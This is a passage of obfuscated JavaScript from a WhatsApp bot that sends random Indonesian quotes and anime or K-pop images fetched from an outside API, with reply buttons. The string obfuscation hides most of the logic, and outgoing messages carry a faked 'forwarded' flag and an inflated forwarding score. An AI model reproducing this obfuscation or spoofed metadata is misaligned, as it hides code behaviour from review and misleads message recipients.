'+_0x39f25f(0x7b5,0x613,0x425,0x196)+_0x1f7707(0x586,0x130,0xcc,0x172),'“Jangan\x20pe'+'rnah\x20jatuh'+'\x20cinta\x20sam'+_0x1f7707(0xa54,0x144,0x597,0x921)+'g,\x20karena\x20'+_0x39f25f(-0x27a,-0x99,-0x18c,-0x1a5)+'sudah\x20repo'+'t,\x20bagaima'+_0x1f7707(-0x1ac,0x2e,0x47,-0x31d)+_0x1f7707(-0x87,0x591,0xf5,-0x131)+'g..??”','“Berlatih\x20'+_0x1f7707(0x4e3,0x4fe,0x375,-0x64)+_0x39f25f(0x792,0x62a,0x2b2,0x927)+_0x1f7707(0x279,0x2ea,0x34e,0x474)+_0x1f7707(0x3c8,0x61e,0x4c6,0x3e)+_0x1f7707(0x65,0x164,-0x2b9,-0x157)+_0x1f7707(0x33,-0x2e,0x21b,0xd8)+_0x39f25f(0x4d7,0x6ed,0xb7e,0x530)+_0x1f7707(-0x26b,-0x1bb,-0x250,0x10e)+_0x39f25f(-0x52c,-0xb6,-0xb2,-0x4d8)+_0x1f7707(0x1f5,-0x23f,0x68,0x39d)+'berlatih?”',_0x1f7707(-0xa7,0x87b,0x400,0x47b)+'\x20nila\x20seti'+_0x1f7707(0x67e,0x315,0x2ea,0x1d0)+_0x39f25f(0x480,0x34b,0x131,0x445)+_0x1f7707(0x22b,0x1f8,0x443,0x1f8)+'ra\x20gara\x20si'+_0x1f7707(0x67e,0x9cc,0x584,0xa29)+'ik…\x20Lupa\x20a'+_0x1f7707(0x14a,-0x34d,-0xe,0x97)+_0x1f7707(0xafc,0x859,0x646,0x875),'“Semakin\x20b'+_0x39f25f(0xef,0x1da,0xed,-0x2df)+_0x1f7707(0x352,0x3a5,-0xb0,-0x258)+_0x1f7707(0x18f,0xd3,-0x12e,-0x2fa)+_0x39f25f(0x59c,0x236,-0x10f,0x122)+_0x1f7707(0x1f,0x5da,0x364,-0xd3)+_0x1f7707(-0x39a,0x3ce,-0xc4,0x2d6)+_0x1f7707(0x48a,-0x2b2,-0x22,-0x4c3)+'\x20tahu,\x20sem'+_0x39f25f(0xa29,0x659,0x815,0x8a4)+'k\x20yang\x20kit'+_0x39f25f(0xaa5,0x81a,0x393,0x56f)+'makin\x20bany'+_0x39f25f(0x3cc,0x227,0x675,0x28f)+_0x39f25f(0x575,0x5d3,0x999,0x6e0)+_0x39f25f(0x99e,0x632,0x874,0x584)+_0x39f25f(-0x23,-0x81,-0x502,0x16b)+_0x1f7707(0x63e,-0xa6,0x33d,0x684)+'\x20Jadi\x20kena'+_0x1f7707(0x5f8,0x816,0x536,0x55f)+'buk\x20belaja'+_0x1f7707(-0x142,-0x3c4,0x73,0x208),'“Jika\x20anda'+_0x1f7707(-0x6c,0x6bb,0x36a,-0x33)+'batu\x20oleh\x20'+_0x39f25f(-0x4b8,-0x26,0x3eb,0x22f)+'\x20janganlah'+_0x1f7707(-0x1db,-0xd2,0x2b1,0x3fb)+_0x1f7707(0x3b0,0x93c,0x5d6,0x587)+_0x1f7707(0x268,0xf8,0x62,-0x15)+_0x39f25f(0x64c,0x2c2,0xf,0xc3)+_0x39f25f(0x77e,0x6a7,0x2a2,0x81d)+_0x39f25f(0x432,0x791,0xa8b,0x880)+'ar\x20bunga\x20k'+_0x1f7707(0x9f2,0x33c,0x5d7,0x1b9)+_0x1f7707(0x3f2,0x329,-0x35,-0x42f)+_0x1f7707(-0x63f,-0x250,-0x1dd,-0x18d)+_0x39f25f(0x293,0x36b,0x3a9,0x4e5)+_0x39f25f(0x64,0x2a5,0x2c3,-0x17e),_0x1f7707(0x966,0x678,0x564,0x188)+'ntik\x20bukan'+_0x1f7707(-0x9b,-0x270,0x119,0x2d0)+_0x39f25f(0x50,0x4f8,0x892,0x1dd)+_0x39f25f(0x5d0,0x660,0x643,0x9f9)+_0x39f25f(0x142,0x570,0x562,0x53d)+'gkan,\x20apal'+_0x1f7707(0x219,0x694,0x396,0x34c)+_0x1f7707(-0x489,-0x283,-0x263,-0x579),_0x1f7707(0x985,0x793,0x607,0x261)+_0x39f25f(0xc53,0x807,0x8e3,0xc1c)+'SALEHA\x20(Su'+_0x39f25f(0x26f,-0x122,0x48,-0x384)+_0x39f25f(0x2ea,0x49b,0x7b6,0x541)+_0x39f25f(0x3e3,0x709,0x4dd,0x3db)+_0x1f7707(-0x99,0x306,0x23,0x7b)+_0x39f25f(0x6fe,0x5ed,0x9e0,0x3eb)+_0x39f25f(0xd0,0x19f,-0x14f,0x2c4)+_0x1f7707(0x20b,-0x133,-0x25e,0x15d)+_0x39f25f(0x7df,0x61f,0x9af,0x946)+_0x39f25f(-0xbb,0xaf,-0x1e3,-0x3c)+_0x39f25f(-0x303,0x9b,-0x21e,0x97)+_0x39f25f(0x8fd,0x4dc,0x78f,0xbd)+_0x39f25f(0x1f3,0x12a,0x94,-0x188)+'ja).”',_0x39f25f(0x505,0x11e,0x7e,0x239)+_0x1f7707(0x1bc,0x340,0x545,0x37b)+_0x1f7707(-0x18c,-0x16b,0x172,0x15a)+_0x39f25f(-0x16c,0x23d,-0x164,0x1f4)+_0x39f25f(0x81e,0x4b7,0x5f8,0x1ce)+_0x1f7707(-0x578,-0x65b,-0x2d8,0x40)+_0x39f25f(0x7af,0x31c,0x6a,-0x11)+'terasa\x20rin'+_0x1f7707(0x514,0x1a8,0x295,0x43d)+_0x1f7707(0x38e,0x769,0x313,0x52b)+'mengerjaka'+'nnya.”'],kata_lucu_=kata_lucu[Math[_0x1f7707(0x3f7,0x496,0xd,-0x30c)](Math[_0x1f7707(-0x5d,0x1a4,-0x63,0xd9)]()*kata_lucu['length'])],_0x12b086={};_0x12b086['displayTex'+'t']='☠️\x20Owner\x20';const _0x153d23={};_0x153d23[_0x39f25f(0x8eb,0x647,0x47d,0x944)]=_0x39f25f(0x949,0x6cb,0x9cf,0x7b6),_0x153d23[_0x1f7707(0x46d,0x229,0x1ce,0x19c)]=_0x12b086,_0x153d23[_0x1f7707(0x667,0x350,0x520,0x69e)]=0x1;const _0x5b38bc={};_0x5b38bc[_0x39f25f(0x287,0x0,0x249,-0x2d6)+'t']=_0x1f7707(0x6ba,0x8cb,0x69e,0xaf8);const _0x5b3ee2={};_0x5b3ee2[_0x1f7707(-0x2,0x479,0x499,0x211)]=''+command,_0x5b3ee2['buttonText']=_0x5b38bc,_0x5b3ee2['type']=0x1;var buttonns=[_0x153d23,_0x5b3ee2];buttonMessage={'contentText':kata_lucu_,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x1f7707(-0x8,0x3d6,0x306,0x6e1)+'more\x20quote'+'s\x20💞')+enter+_0x39f25f(-0x4ae,-0x48,-0x271,-0x1f1)+sender[_0x1f7707(0x486,0x5b2,0x20e,0x117)]('@')[0x174b+-0x22*0xe5+0x71f],'buttons':buttonns,'headerType':0x1};const _0xe9bda2={};_0xe9bda2[_0x39f25f(0x2ff,0x3cc,-0x7a,0x50f)]='hi',_0xe9bda2[_0x39f25f(0x23c,0x6ba,0xafa,0x5a6)+_0x1f7707(0x5f,-0x18b,0x0,-0x46f)]=0x3b9aca00,_0xe9bda2['isForwarde'+'d']=!![],_0xe9bda2[_0x39f25f(0xaba,0x688,0x83e,0x4d6)+_0x39f25f(-0xad,0x2c6,0x68f,0x776)]=!![],_0xe9bda2[_0x39f25f(0x29b,0x63f,0x645,0x2ef)+'id']=[sender];const _0x492f30={};_0x492f30['caption']=_0x1f7707(0x2c8,0x243,-0xe5,0x1a2)+'21',_0x492f30[_0x1f7707(0x51e,0x366,0x52f,0x9e4)+'o']=_0xe9bda2,_0x492f30[_0x1f7707(0x345,-0x496,-0xa8,-0x40a)]=ftoko,_0x492f30[_0x1f7707(0x366,0x7de,0x4da,0x6d6)+_0x39f25f(-0x13e,0x2c6,0x3a2,0x22b)]=!![],alpha['sendMessag'+'e'](from,buttonMessage,MessageType[_0x1f7707(-0x3bd,0x300,0x65,0x499)+_0x1f7707(-0x563,-0x356,-0x23b,0x239)],_0x492f30);break;case'katacaklon'+_0x39f25f(-0x2b6,-0x76,-0x19d,0x259):const longtong=['Lebih\x20baik'+_0x1f7707(-0xf0,-0xd5,-0x1e7,-0x438)+_0x39f25f(0x7d9,0x7cf,0x4e0,0x897)+_0x1f7707(0x17c,0x2c8,0x609,0x192)+_0x39f25f(0x729,0x692,0x99b,0x30e)+_0x39f25f(0x41d,0x256,0x6ac,0x8e)+_0x1f7707(-0x66,-0x450,-0x1da,-0x15f)+_0x1f7707(-0x2c7,0x204,-0x231,0x7b)+_0x39f25f(0x782,0x3a9,0x610,0x6),_0x39f25f(0x315,0x47e,0x549,0xa4)+_0x39f25f(0x4b8,0x5ba,0x9df,0x3fb)+_0x39f25f(0x495,0x10d,0x320,0x25b)+_0x39f25f(0x43d,0x606,0x236,0x93c)+_0x1f7707(-0x420,0x1af,-0x27a,0x102)+_0x1f7707(-0x76e,-0x427,-0x2c4,-0x75e)+'telah\x20kopi'+'\x20itu\x20jadi\x20'+'dibuat','Mendidik\x20s'+_0x39f25f(-0x24,0x154,0x4ce,0x15)+'a\x20sama\x20den'+_0x1f7707(0x7e8,0x2f,0x44e,0x1f0)+_0x39f25f(0x3ca,0x542,0x864,0x7a8)+_0x1f7707(0x31f,0x78c,0x413,0x162)+_0x1f7707(0x577,0x5d1,0x126,0xcb)+_0x1f7707(-0x1d1,-0xf4,0x24d,-0xc3)+_0x39f25f(0x957,0x4e5,0x440,0x6c1)+'a\x20dengan\x20m'+'endidik\x20se'+_0x1f7707(0x105,-0x259,-0xce,-0x4ea)+_0x1f7707(0x928,0x6c6,0x4a3,0x8bc),'Membaca\x20se'+_0x1f7707(0x268,-0x49d,0x11,0x301)+_0x39f25f(-0x2f8,-0x36,-0x1d3,-0x5f)+_0x39f25f(0x63b,0x215,-0x1dc,-0x98)+_0x1f7707(-0x252,0x350,0x1f0,0x1a6)+_0x1f7707(0xee,0x56,-0x12,-0x4bb)+_0x1f7707(-0x452,0x134,-0x43,0x336)+'i',_0x1f7707(0x1e4,0x461,0x275,-0x15e)+_0x39f25f(-0x92,0x377,0x739,0x1d7)+'gan\x20takut\x20'+_0x1f7707(0x4a2,0x924,0x4ec,0x121)+_0x1f7707(0x29f,0x1af,0x552,0x4be)+_0x1f7707(-0x5eb,0x339,-0x152,-0x4e7)+_0x39f25f(0x5e1,0x5b5,0x35b,0x212)+_0x39f25f(0x49c,0x1ba,-0x175,0x663)+_0x39f25f(0x2b4,-0xfe,-0xfd,-0x43)+_0x39f25f(-0x4b,-0x1,-0x411,0x1d5),_0x39f25f(0x203,0x2c,0x1cf,0x10d)+_0x1f7707(0x837,-0xca,0x3b3,0x39b)+_0x39f25f(0x533,0x503,0x883,0x728)+'g\x20sok\x20tau,'+'\x20banyak\x20ng'+_0x39f25f(0x752,0x413,0x2e9,0x68b)+_0x1f7707(0x539,0x3b5,0x647,0x7da)+_0x1f7707(-0x32c,-0x35c,-0x1ed,0x288)+'\x20saya\x20diam'+_0x1f7707(0x3a8,0x78f,0x571,0x856)+_0x39f25f(0x505,0x3e5,-0xc4,0x1c0)+_0x39f25f(0x5e8,0x7b9,0x339,0x482)+_0x1f7707(-0x96,0x247,0x2a4,0x4a5)+_0x39f25f(0x883,0x6cd,0x9b3,0x546),_0x1f7707(0x573,0x2df,0x2e7,0x6e2)+_0x1f7707(0x7a9,0x601,0x3df,0xa1)+_0x39f25f(-0x97,0x23b,0x27b,0x5cf)+'yang\x20membu'+_0x1f7707(-0x34e,0x230,-0x62,-0x2cc)+_0x1f7707(0x206,0x81e,0x5c5,0x7b5)+'dalah...\x20T'+_0x1f7707(-0x136,0x2cb,0x2bc,0x32a)+_0x39f25f(-0x234,0x102,-0x2f8,-0xdb)+'i\x20lima\x20itu'+_0x39f25f(0x63e,0x464,0x51,0x452)+_0x39f25f(0xa1d,0x65e,0x339,0x885),_0x39f25f(-0x288,0x74,0x167,-0x29e)+'ah\x20pengorb'+_0x1f7707(0x81f,0x98e,0x5c0,0x376)+_0x1f7707(0x4b4,-0x22,0x19b,0x13f)+_0x1f7707(-0x2cf,0x18e,-0x100,-0xd1)+_0x39f25f(0xbe0,0x765,0x531,0x2e4)+'anya\x20pende'+_0x1f7707(0x413,0x318,-0x1,0x284),_0x1f7707(0x49f,0x32b,0x2ba,0xa9)+'takut\x20mera'+_0x1f7707(0x56e,0x606,0x1d6,0x3fa)+_0x39f25f(0x932,0x622,0xadc,0xa7f)+_0x1f7707(-0x14f,0x63,0xd6,-0x9c)+_0x1f7707(-0x463,-0x3a7,-0x268,-0xf3)+_0x1f7707(-0x2d4,-0x5e9,-0x1d3,-0x3fd)+_0x39f25f(0x81b,0x6e2,0x941,0xac7)+'s\x20duluan\x20s'+'ebelum\x20jad'+'ian',_0x1f7707(-0x502,0x25d,-0x182,-0xf8)+_0x39f25f(-0x21f,0x19b,0x296,-0x122)+_0x39f25f(0xb,0x104,-0x230,0x554)+_0x39f25f(0x585,0x741,0x846,0x888)+_0x39f25f(0x68d,0x564,0x6a0,0x807)+_0x39f25f(0x633,0x817,0x809,0xc65)+_0x1f7707(-0x121,0x381,0xff,0x432)+_0x39f25f(-0x2aa,-0x51,0x44c,0x246)+_0x1f7707(0x57e,0x148,0x42a,0x26b)+_0x39f25f(0x4c9,0x197,0x3e8,0x545)+_0x39f25f(0x274,-0x2b,-0x98,-0x26c),'Ada\x20tips\x20a'+_0x1f7707(0x769,0x833,0x440,0x8d1)+_0x39f25f(-0x38,0x1cd,0x581,-0x266)+_0x39f25f(-0x2c,0xd3,-0x30c,0x505)+_0x1f7707(0x46e,0x846,0x59f,0x5da)+_0x1f7707(0x8f,0x257,-0x16,0x58)+_0x39f25f(0xb03,0x64d,0x899,0x826)+'anak\x20saya\x20'+_0x39f25f(0x2ee,0x5b2,0x422,0x578)+_0x39f25f(0xc0b,0x76d,0xa02,0x8f5)+_0x1f7707(0x52a,0x5f0,0x291,0x1e)+_0x39f25f(0x48e,0xf5,0x1e1,-0x145)+'di\x20ringan',_0x39f25f(0x7ec,0x39d,0x201,0x293)+_0x39f25f(0x23d,0x6bd,0x610,0x7ce)+_0x39f25f(0xacc,0x811,0x5a3,0x543)+_0x39f25f(-0x1f0,0x202,-0x289,0x69a)+_0x1f7707(0x24f,0x6,0x43e,0x54e)+_0x39f25f(-0x2df,0x1c6,-0x244,0x52e)+_0x1f7707(-0x422,-0x1d5,-0x27d,0x135)+'ah\x20bahwa\x20y'+'ang\x20kamu\x20a'+'lami\x20sekar'+_0x39f25f(0x1ed,0x359,0x4a9,-0xf8)+_0x1f7707(0x7c,-0x3e9,-0x16a,-0x388)+'ari\x20Tuhan',_0x39f25f(0x283,0x6b2,0x626,0x624)+'ut\x20itu\x20pen'+_0x39f25f(-0x44a,-0x49,-0x10c,-0x265)+'t\x20itu\x20mene'+_0x39f25f(0x52f,0x1c5,0x22,0x666)+_0x39f25f(0x1b5,-0x2a,0xaf,-0x1ee)+_0x39f25f(-0x22d,0x230,0x355,0x314),_0x1f7707(0x105,-0x12d,-0xae,-0x500)+_0x39f25f(0x19e,-0x106,-0x3e6,0x1c8)+_0x1f7707(0x23e,-0x345,-0x1e8,-0x406)+'ki\x20yang\x20bi'+'sa\x20menghas'+_0x1f7707(-0x1dc,0x31c,0x14a,0x23)+_0x39f25f(0x11,0x17f,0x365,0x4c1)+_0x1f7707(0x55b,-0x134,0x260,0x45a)+_0x39f25f(-0x4e4,-0xf3,-0xed,-0x2c)+_0x39f25f(0x29d,0xe7,0x340,0x4ef)+_0x39f25f(0x3cc,0x420,0x604,0x16f)+_0x1f7707(-0x1c7,0x576,0x25f,-0xb5)+_0x1f7707(0x2e9,0x4a3,0x320,0x732),'Sebenarnya'+_0x1f7707(-0x488,0x94,-0x4e,0x41)+'u\x20bukan\x20ti'+_0x1f7707(0x2e2,0x898,0x539,0xb3)+_0x39f25f(0x82,0x1ac,0x44a,-0x1a4)+_0x39f25f(0xa2b,0x737,0x9f2,0xb7c)+_0x39f25f(0x7d0,0x480,0x188,0x38b)+_0x39f25f(0x49e,0x9d,-0x228,0x118)+_0x1f7707(-0xe1,0x325,0x2e1,0x414),_0x1f7707(0x6da,0x3c4,0x2d5,0x5e2)+_0x1f7707(-0x208,0x3c4,0x247,-0x92)+_0x39f25f(0x46,0x322,0x702,0x64e)+'r\x20oleh\x20ser'+_0x1f7707(0x304,0xb9,0x537,0x297)+'is\x20yang\x20ad'+_0x39f25f(0x47f,-0xe,-0x85,0x118)+_0x39f25f(0x21f,0x65f,0xb15,0x4d9)+_0x1f7707(0x6b7,0x31c,0x282,0x5fa)+_0x39f25f(0xa1,0x201,-0xa8,-0x20b)+'\x20akan\x20hanc'+_0x1f7707(0x5c7,0x602,0x2bb,0x1e1)+_0x39f25f(0x4c6,0x5fe,0x595,0xa45)+'beberapa\x20k'+_0x1f7707(-0x413,-0x266,-0x11f,-0x21)+'\x20negara\x20te'+_0x39f25f(0x582,0x81e,0x492,0x6b7),_0x39f25f(-0xd6,0x208,0x5ae,0x210)+_0x39f25f(0x4e5,0x29b,-0x10e,0x623)+'an\x20kalau\x20y'+'ang\x20berpua'+_0x1f7707(0x473,-0x166,0x83,0x348)+_0x1f7707(-0xfd,-0x6a,0x124,0x4ae)+'idak\x20minum'+_0x39f25f(-0x16a,-0xa5,-0x199,-0x2cc)+_0x1f7707(0x21c,0x6a8,0x255,0x4aa)+_0x39f25f(0xbe5,0x80e,0xa2c,0xab7)+'an\x20tidak\x20m'+_0x39f25f(0x60b,0x82c,0xc66,0x63b)+'\x20mereka\x20se'+_0x39f25f(0x281,0x4e9,0x76a,0x56e)+'asa',_0x39f25f(0x104,-0x5,0x8d,0x43)+_0x39f25f(0x3d5,0x19a,0x371,-0x1f2)+_0x39f25f(0xc3c,0x84a,0x3d0,0x7cd)+_0x39f25f(0x896,0x5f3,0x1a8,0x77a)+'n.\x20Tapi,\x20b'+_0x39f25f(-0x388,-0x11,-0x5,-0x355)+_0x1f7707(0x21d,0x19f,-0x227,-0x3f)+'alaman',_0x39f25f(0x7a4,0x6d4,0x922,0x3cb)+'\x20takut\x20men'+_0x1f7707(0x428,0x6f,-0x33,-0x2ce)+_0x1f7707(-0x1b3,-0x64c,-0x205,-0x6a7)+_0x1f7707(0x5bd,0x694,0x4ca,0x157)+_0x39f25f(0x8d8,0x772,0xada,0x632)+_0x1f7707(0x1d1,0x640,0x628,0x834)+_0x39f25f(0x40e,0x3c3,0x6fa,0x4dc)+_0x1f7707(0x2eb,-0x1f7,-0x135,-0xe1),_0x1f7707(0x500,0x6c9,0x629,0x37c)+_0x1f7707(0x9a,0x15c,0x202,-0x7b)+_0x1f7707(-0x11f,0x1dc,-0x1bd,-0xda)+_0x39f25f(0x1e1,0x1d9,-0x22d,0x2cf)+_0x1f7707(-0x7,0x805,0x483,0x6db)+_0x39f25f(0x270,0xd,-0x82,0x24d)+_0x39f25f(0x3f2,0xdf,-0xee,0x3c9)+_0x1f7707(0x5fe,0x4c1,0x1f6,0xe)+_0x39f25f(-0x30d,0x16c,0x15e,0x3b9)+'dengan\x20bij'+'aksana'],longtong_=longtong[Math[_0x1f7707(-0x90,0x1d3,0xd,0x3fc)](Math[_0x39f25f(0x362,0x14b,-0xe7,0x2bb)]()*longtong['length'])],_0x42509c={};_0x42509c[_0x39f25f(0x81,0x0,-0x265,-0x4b6)+'t']='☠️\x20Owner\x20';const _0x4754c7={};_0x4754c7[_0x39f25f(0x1ea,0x647,0x71c,0x642)]=_0x39f25f(0xa2b,0x6cb,0x327,0x248),_0x4754c7['buttonText']=_0x42509c,_0x4754c7[_0x1f7707(0x147,0x397,0x520,0x934)]=0x1;const _0x1b7f88={};_0x1b7f88['displayTex'+'t']='Next\x20➡️';const _0x29cb55={};_0x29cb55[_0x39f25f(0x3a6,0x647,0x714,0xa7b)]=''+command,_0x29cb55[_0x39f25f(0x120,0x37c,-0xbc,0x163)]=_0x1b7f88,_0x29cb55[_0x1f7707(0x513,0x863,0x520,0x255)]=0x1;var buttonns=[_0x4754c7,_0x29cb55];buttonMessage={'contentText':longtong_,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x1f7707(0x2ec,0x427,0x306,0x782)+_0x1f7707(-0x30a,-0x1dd,-0x237,-0xfa)+_0x39f25f(0xd,0xe3,0x26,0x17c))+enter+_0x39f25f(-0x359,-0x48,-0x1c2,-0x3c1)+sender[_0x1f7707(0x15a,0x393,0x20e,-0x3d)]('@')[-0x15d6+-0x1*-0x261e+-0x1048],'buttons':buttonns,'headerType':0x1};const _0xf896ee={};_0xf896ee[_0x39f25f(0x6e6,0x3cc,0x542,0x4b7)]='hi',_0xf896ee['forwarding'+'Score']=0x3b9aca00,_0xf896ee[_0x1f7707(0x313,-0x5e6,-0x151,0x94)+'d']=!![],_0xf896ee['sendEpheme'+_0x1f7707(-0x49,-0x2bd,0x118,-0x333)]=!![],_0xf896ee[_0x1f7707(0x86e,0x2ff,0x491,0x46d)+'id']=[sender];const _0x1fa826={};_0x1fa826[_0x1f7707(-0xc9,0x239,-0x92,-0x2a1)]=_0x1f7707(0x196,0x357,-0xe5,0x338)+'21',_0x1fa826['contextInf'+'o']=_0xf896ee,_0x1fa826[_0x39f25f(0x178,0x106,-0x78,0x345)]=ftoko,_0x1fa826[_0x39f25f(0x432,0x688,0x78b,0xab9)+'ral']=!![],alpha[_0x1f7707(-0x267,-0x2c2,-0x232,-0x1a4)+'e'](from,buttonMessage,MessageType[_0x39f25f(-0xa1,0x213,0x657,0x4af)+'sage'],_0x1fa826);break;case _0x39f25f(-0x1d5,-0xe3,0x36,-0xba):case'anna':case _0x39f25f(0x457,0x471,0x509,0x62d):case'ayuzawa':case'chitoge':case _0x39f25f(-0x2b5,0x18b,-0x1d0,-0x178):case'erza':case _0x39f25f(0x55d,0x367,0x38a,0x615):case _0x1f7707(0x8f3,0x3a8,0x496,0x81f):case _0x39f25f(0x34b,0x5b1,0x3c3,0x21f):case _0x1f7707(0x2bf,-0x32d,0x9d,-0x226)+_0x39f25f(0x25f,0x336,-0x47,0x2db):case'kotori_min'+_0x1f7707(0x36,0xf0,0xf,0x3e5):case _0x39f25f(0xbd,-0xe5,0x17a,-0x8b):case _0x39f25f(0x5ff,0x436,0x428,0x220)+'a':case'mizore_sir'+_0x1f7707(-0x160,-0x293,-0x1eb,-0x3d1):case _0x39f25f(-0x27e,0x1ed,0x35f,0x5ff)+'ce':case _0x39f25f(0x400,0x3ba,0x6fc,-0x5f):case _0x39f25f(0x420,0x434,0x58d,0x621)+_0x1f7707(0x11,-0x148,-0x24,-0x1ed):case _0x39f25f(0xff,0x84,-0xeb,-0x247):case'sasuke':case _0x1f7707(0x481,0x5e0,0x31e,-0x122)+'u':case _0x1f7707(0x1e0,0xa6,0x3cf,0x390):case _0x39f25f(0x8e,0x3a2,0x31c,0xc6):case _0x39f25f(-0x84,0x1c,0x418,-0x113):case _0x1f7707(0x247,0x7e7,0x40e,0x730):case _0x1f7707(-0xf3,-0x1bd,0x19e,0x264):case _0x39f25f(0x626,0x553,0x5bd,0x799):case _0x39f25f(0x869,0x74a,0x462,0x55d):reply(lang['wait']());var anime=await fetchJson(_0x1f7707(0x4fc,0x4aa,0x58e,0x9df)+_0x1f7707(-0x4b4,-0x23a,-0x16d,-0x1)+_0x1f7707(0x589,0x77d,0x5da,0xa69)+'.com/api/a'+'nime/'+command+(_0x1f7707(-0x651,-0x5d8,-0x1cd,-0x335)+_0x39f25f(-0x1d0,0xb6,0x1d2,0x3a6)));let random_anime=await getBuffer(anime['result']);const mediaxxxxxx=await alpha[_0x1f7707(-0x29f,0x36a,-0xd3,-0x244)+_0x39f25f(-0x46d,-0x8d,0xc4,-0x262)](from,random_anime,MessageType[_0x39f25f(0x23b,0x51,0x198,-0x2fc)],{'thumbnail':Buffer[_0x39f25f(0x4ce,0xf4,0x12b,-0x193)](-0x326+-0x12*-0x15+0x1ac)});let bacotluxxxxxx=mediaxxxxxx['message']['ephemeralM'+_0x1f7707(-0x71,0x453,0x9a,-0x10)]?mediaxxxxxx['message'][_0x39f25f(0x66e,0x5d5,0x11a,0x685)+_0x39f25f(-0x190,0x248,0xcc,-0x63)]:mediaxxxxxx;const _0x480913={};_0x480913[_0x1f7707(-0x54c,-0x336,-0x1ae,-0x546)+'t']=_0x39f25f(0x152,-0x7b,-0x45d,-0x2b0);const _0x17edc3={};_0x17edc3[_0x1f7707(0x7d5,0x6c8,0x499,0x73e)]='owner',_0x17edc3[_0x1f7707(-0xfe,-0x2c6,0x1ce,0x6e)]=_0x480913,_0x17edc3[_0x39f25f(0x6b0,0x6ce,0x26e,0x400)]=0x1;const _0x3b2ab8={};_0x3b2ab8[_0x1f7707(-0x243,0x2d8,-0x1ae,-0x5ba)+'t']=_0x39f25f(0x418,0x84c,0xb47,0xc67);const _0x277948={};_0x277948[_0x1f7707(0x4dc,0x52a,0x499,0x550)]=''+command,_0x277948[_0x1f7707(-0x1db,-0x23d,0x1ce,-0x12c)]=_0x3b2ab8,_0x277948[_0x39f25f(0xa66,0x6ce,0x381,0x706)]=0x1;const buttonsxxxxxx=[_0x17edc3,_0x277948],btnxxxxx__={'contentText':lang[_0x39f25f(0x189,0x4d9,0x9e,0x158)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x1f7707(0x354,0x1af,0x99,0x43b)+_0x39f25f(0x363,0x2a0,0x5b4,0x2e8))+sender['split']('@')[-0x3*-0x1a7+0xccc+-0x11c1],'buttons':buttonsxxxxxx,'headerType':0x4,'imageMessage':bacotluxxxxxx[_0x39f25f(0x2f8,-0xdc,0x3b9,-0x36a)]['imageMessa'+'ge']},_0x55af3f={};_0x55af3f[_0x39f25f(0x3c8,0x63f,0xa97,0x871)+'id']=[sender];const _0x2277f2={};_0x2277f2[_0x1f7707(-0x3c5,0x13d,-0xa8,0x327)]=mek,_0x2277f2[_0x39f25f(0x9b7,0x6dd,0x9a7,0xb12)+'o']=_0x55af3f,alpha[_0x1f7707(-0x459,-0x452,-0x232,-0x650)+'e'](from,btnxxxxx__,MessageType['buttonsMes'+_0x39f25f(0x1a7,-0x8d,-0xe0,-0x452)],_0x2277f2)[_0x39f25f(0x805,0x6f9,0x2d4,0x75f)](_0x47daca=>{function _0x26e329(_0x431989,_0x28af5f,_0x3c5f53,_0x337fb8){return _0x39f25f(_0x28af5f,_0x337fb8- -0x1b8,_0x3c5f53-0x6f,_0x337fb8-0xcf);}const _0x213c98={'aOYfr':function(_0x2c6006,_0x2153eb){return _0x2c6006(_0x2153eb);},'bEcKg':_0x164b66(0x8cb,0x41f,0x6b3,0x6de)+_0x164b66(0x3cd,0x2da,0x374,0x53f)+_0x164b66(0x6ac,0x2b4,0x4a2,0x856)+_0x26e329(-0x1d0,-0xde,-0x36b,0x13c)+'gi'};function _0x164b66(_0x1053a1,_0x50e9aa,_0x516912,_0x370418){return _0x39f25f(_0x370418,_0x516912-0x20c,_0x516912-0x13a,_0x370418-0x1d7);}_0x213c98[_0x164b66(0x5f3,0x77e,0x8fd,0x86d)](reply,_0x213c98[_0x164b66(0x689,0x52b,0x35f,0x74f)]);});break;case _0x1f7707(0x71e,0x35d,0x5cb,0x194):case _0x1f7707(-0x1,0x0,-0x82,0xe0)+'o':case _0x39f25f(0x189,0x5f,-0x7e,0x41e):case _0x39f25f(0x65b,0x482,0x493,0x75b):case _0x1f7707(-0x2b8,0x4ab,0x21,-0x295):case _0x1f7707(0x33f,-0x293,0x10b,-0x38):case _0x39f25f(-0x3d3,0x5,0x3b1,-0x76):case _0x1f7707(-0x48,0x405,0x3d9,-0xb):case _0x1f7707(0x7b,-0x44c,-0x82,0xab)+'o':case'kimjunmyeo'+'n':case _0x39f25f(0x96e,0x7a0,0xb98,0x741):case _0x1f7707(-0x448,0x225,0x37,0x49a):case'kimseok':case _0x1f7707(0x773,0x74b,0x5fc,0x7fe)+'g':case _0x39f25f(0x56c,0x6e9,0x49e,0x6d5):case _0x39f25f(0x70b,0x522,0x891,0x355):case _0x39f25f(0x6e6,0x57b,0x94c,0x7ec)+'ol':case _0x1f7707(0x28,0x2e,0x256,0x3ee):case _0x39f25f(0x184,0x89,0x20b,-0x28d):reply(lang['wait']());var cogan=await fetchJson(_0x1f7707(0x70f,0xa2e,0x58e,0x482)+_0x1f7707(-0x254,-0x47c,-0x16d,-0x2b9)+_0x1f7707(0xa38,0x147,0x5da,0x7c9)+_0x39f25f(0x901,0x573,0x87f,0x718)+_0x39f25f(0x512,0x10a,-0x1e4,0x4d4)+command+('?apikey=of'+_0x39f25f(0x2df,0xb6,-0x246,-0xaf)));let random_cogan=await getBuffer(cogan[_0x1f7707(0x7fc,0x11e,0x38f,0x62b)]);const mediaxxxxx=await alpha[_0x1f7707(-0x20e,-0x565,-0xd3,-0x30c)+'sage'](from,random_cogan,MessageType[_0x1f7707(-0x2c2,0x77,-0x15d,0x40)],{'thumbnail':Buffer[_0x1f7707(-0x148,0x263,-0xba,0x46)](-0x3*0x797+-0x1f9d*-0x1+-0x236*0x4)});let bacotluxxxxx=mediaxxxxx[_0x39f25f(-0x197,-0xdc,-0x323,0x26f)][_0x1f7707(0x8ab,0x37e,0x427,0x8d1)+'essage']?mediaxxxxx['message'][_0x1f7707(0x24b,0x6a7,0x427,-0x38)+_0x39f25f(0x4a8,0x248,0xf9,-0xce)]:mediaxxxxx;const _0x4f0b4e={};_0x4f0b4e[_0x1f7707(0x232,-0x410,-0x1ae,-0x281)+'t']=_0x1f7707(0x245,-0x5e,-0x229,0x55);const 